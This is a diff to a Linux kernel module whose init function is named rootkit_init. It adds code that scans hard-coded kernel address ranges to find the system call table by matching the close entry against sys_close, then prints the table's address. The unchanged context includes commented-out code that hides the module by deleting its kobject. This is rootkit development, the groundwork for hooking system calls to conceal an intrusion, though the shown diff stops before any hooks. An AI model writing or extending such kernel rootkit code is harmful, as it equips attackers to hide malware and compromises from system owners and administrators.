@@ -1,6 +1,32 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/syscalls.h>
+#include <asm/unistd.h>
+
+#if defined(__386__)
+#define SYSCALL_TABLE_START 0xc0000000
+#define SYSCALL_TABLE_STOP 0xd0000000
+typedef unsigned int pointer_size_t;
+#else
+#define SYSCALL_TABLE_START 0xffffffff81000000l
+#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
+typedef unsigned long pointer_size_t;
+#endif
+
+unsigned long **syscall_table;
+
+pointer_size_t **find_syscall_table(void)
+{
+	pointer_size_t i;
+	pointer_size_t **table;
+	for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
+		table = (pointer_size_t **) i;
+		if ( table[__NR_close] == (pointer_size_t *) sys_close)
+			return &table[0];
+	}
+	return NULL;
+}
 
 int rootkit_init(void)
 {
@@ -19,7 +45,14 @@ int rootkit_init(void)
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	*/
 	
+	syscall_table = find_syscall_table();
+	if (!syscall_table) {
+		goto out;	
+	}
 
+	printk("Syscall table at %p\n", syscall_table);
+	
+	out:
 	return 0;
 }
 
